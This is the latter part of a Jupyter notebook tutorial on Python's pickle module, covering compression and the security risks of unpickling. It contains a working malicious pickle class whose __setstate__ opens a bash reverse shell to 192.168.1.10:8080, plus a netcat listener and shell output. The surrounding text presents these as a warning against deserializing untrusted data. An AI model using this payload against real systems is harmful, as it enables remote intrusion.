   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "259"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    ">>> import pickle\n",
    ">>> import bz2\n",
    ">>> my_string = \"\"\"Per me si va ne la città dolente,\n",
    "... per me si va ne l'etterno dolore,\n",
    "... per me si va tra la perduta gente.\n",
    "... Giustizia mosse il mio alto fattore:\n",
    "... fecemi la divina podestate,\n",
    "... la somma sapienza e 'l primo amore;\n",
    "... dinanzi a me non fuor cose create\n",
    "... se non etterne, e io etterno duro.\n",
    "... Lasciate ogne speranza, voi ch'intrate.\"\"\"\n",
    ">>> pickled = pickle.dumps(my_string)\n",
    ">>> compressed = bz2.compress(pickled)\n",
    ">>> len(my_string)\n",
    "315\n",
    ">>> len(compressed)\n",
    "259"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "When using compression, bear in mind that smaller files come at the cost of a slower process."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a class=\"anchor\" id=\"security_concerns_with_the_python_pickle_module\"></a>\n",
    "## Security Concerns With the Python pickle Module [<img src=\"../../images/logos/back_to_top.png\" width=\"22\" align= \"center\"/>](#table_of_contents)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You now know how to use the `pickle` module to serialize and deserialize objects in Python. The serialization process is very convenient when you need to save your object’s state to disk or to transmit it over a network."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "However, there’s one more thing you need to know about the Python `pickle` module: It’s not secure. Do you remember the discussion of `__setstate__()`? Well, that method is great for doing more initialization while unpickling, but it can also be used to execute arbitrary code during the unpickling process!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So, what can you do to reduce this risk?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Sadly, not much. The rule of thumb is to **never unpickle data that comes from an untrusted source or is transmitted over an insecure network**. In order to prevent man-in-the-middle attacks, it’s a good idea to use libraries such as `hmac` to sign the data and ensure it hasn’t been tampered with.\n",
    "\n",
    "The following example illustrates how unpickling a tampered pickle could expose your system to attackers, even giving them a working remote shell:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "# remote.py\n",
    "import pickle\n",
    "import os\n",
    "\n",
    "class foobar:\n",
    "    def __init__(self):\n",
    "        pass\n",
    "\n",
    "    def __getstate__(self):\n",
    "        return self.__dict__\n",
    "\n",
    "    def __setstate__(self, state):\n",
    "        # The attack is from 192.168.1.10\n",
    "        # The attacker is listening on port 8080\n",
    "        os.system('/bin/bash -c \"/bin/bash -i >& /dev/tcp/192.168.1.10/8080 0>&1\"')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "pickle.dump(foobar(), open(\"./bad.pkl\", 'wb'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "my_foobar = foobar()\n",
    "my_pickle = pickle.dumps(my_foobar)\n",
    "my_unpickle = pickle.loads(my_pickle)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In this example, the unpickling process executes `__setstate__()`, which executes a Bash command to open a remote shell to the `192.168.1.10` machine on port `8080`."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Here’s how you can safely test this script on your Mac or your Linux box. First, open the terminal and use the nc command to listen for a connection to port 8080:\n",
    "\n",
    "```bash\n",
    "nc -l 8080\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This will be the attacker terminal. If everything works, then the command will seem to hang."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Next, open another terminal on the same computer (or on any other computer on the network) and execute the Python code above for unpickling the malicious code. Be sure to change the IP address in the code to your attacking terminal’s IP address. In my example, the attacker’s IP address is `192.168.1.10`."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "By executing this code, the victim will expose a shell to the attacker."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If everything works, a Bash shell will appear on the attacking console. This console can now operate directly on the attacked system:\n",
    "\n",
    "```bash\n",
    "$ nc -l 8080\n",
    "bash: no job control in this shell\n",
    "\n",
    "The default interactive shell is now zsh.\n",
    "To update your account to use zsh, please run `chsh -s /bin/zsh`.\n",
    "For more details, please visit https://support.apple.com/kb/HT208050.\n",
    "bash-3.2$\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So, let me repeat this critical point once again: **Do not use the `pickle` module to deserialize objects from untrusted sources!**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a class=\"anchor\" id=\"conclusion\"></a>\n",
    "## <img src=\"../../images/logos/checkmark.png\" width=\"20\"/> Conclusion  [<img src=\"../../images/logos/back_to_top.png\" width=\"22\" align= \"center\"/>](#table_of_contents)\n",
    "\n",
    "You now know how to use the Python `pickle` module to convert an object hierarchy to a stream of bytes that can be saved to a disk or transmitted over a network. You also know that the deserialization process in Python must be used with care since unpickling something that comes from an untrusted source can be extremely dangerous."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In this tutorial, you’ve learned:\n",
    "\n",
    "- What it means to **serialize** and **deserialize** an object\n",
    "- Which **modules** you can use to serialize objects in Python\n",
    "- Which kinds of objects can be serialized with the Python pickle module\n",
    "- How to use the Python pickle module to serialize **object hierarchies**\n",
    "- What the **risks** are of unpickling from an untrusted source\n",
    "\n",
    "With this knowledge, you’re well equipped to persist your objects using the Python `pickle` module. As an added bonus, you’re ready to explain the dangers of deserializing malicious pickles to your friends and coworkers."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
